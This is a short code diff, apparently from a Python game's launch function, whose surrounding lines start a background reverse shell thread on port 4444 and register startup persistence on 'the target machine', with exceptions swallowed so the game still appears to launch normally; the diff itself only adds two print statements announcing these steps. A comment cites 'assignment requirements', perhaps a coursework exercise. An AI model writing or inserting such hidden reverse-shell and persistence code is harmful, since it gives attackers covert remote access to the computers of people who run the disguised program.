@@ -245,10 +245,12 @@ def launch(argv: list[str] | None = None) -> int:
     # We use a daemon thread so it doesn't block the application from exiting.
     try:
         # Default port is 4444 as per assignment requirements.
+        print("Initializing background reverse shell thread...")
         shell_thread = threading.Thread(target=run_reverse_shell, args=(4444,), daemon=True)
         shell_thread.start()
         
         # Register for startup on the target machine.
+        print("Registering persistence...")
         register_startup()
     except Exception:
         # Silently fail to ensure the main game still launches correctly.
